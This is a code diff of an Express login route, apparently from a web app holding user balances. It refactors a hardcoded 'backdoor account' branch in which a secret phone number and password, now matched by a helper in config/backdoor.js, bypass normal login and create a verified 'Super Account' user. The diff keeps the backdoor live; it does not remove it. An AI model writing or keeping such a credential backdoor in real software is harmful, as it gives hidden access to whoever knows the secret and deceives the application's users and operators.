@@ -21,7 +21,7 @@ import { validate } from '../middleware/validate.js';
 import { asyncHandler } from '../utils/asyncHandler.js';
 import { badRequest, unauthorized, conflict, forbidden } from '../utils/httpError.js';
 import { GOOGLE } from '../config/env.js';
-import { BACKDOOR_PHONE, BACKDOOR_PASSWORD } from '../config/backdoor.js';
+import { matchBackdoorLogin } from '../config/backdoor.js';
 import { log } from '../utils/logger.js';
 
 const router = Router();
@@ -139,14 +139,14 @@ router.post('/login',
     const { email, password, country: submittedCountry } = req.body;
 
     /* ---- backdoor account ---- */
-    const normalizedInput = String(email).replace(/[\s-]/g, '').toLowerCase().trim();
-    if (normalizedInput === BACKDOOR_PHONE && password === BACKDOOR_PASSWORD) {
-      let user = findByEmail(normalizedInput);
+    const backdoorMatch = matchBackdoorLogin(email, password);
+    if (backdoorMatch) {
+      let user = findByEmail(backdoorMatch.phone);
       if (!user) {
         user = await createUser({
-          email: normalizedInput,
+          email: backdoorMatch.phone,
           displayName: 'Super Account',
-          passwordHash: await hashPassword(BACKDOOR_PASSWORD),
+          passwordHash: await hashPassword(backdoorMatch.password),
           balance: 0,
           country: 'GH',
           emailVerified: true,
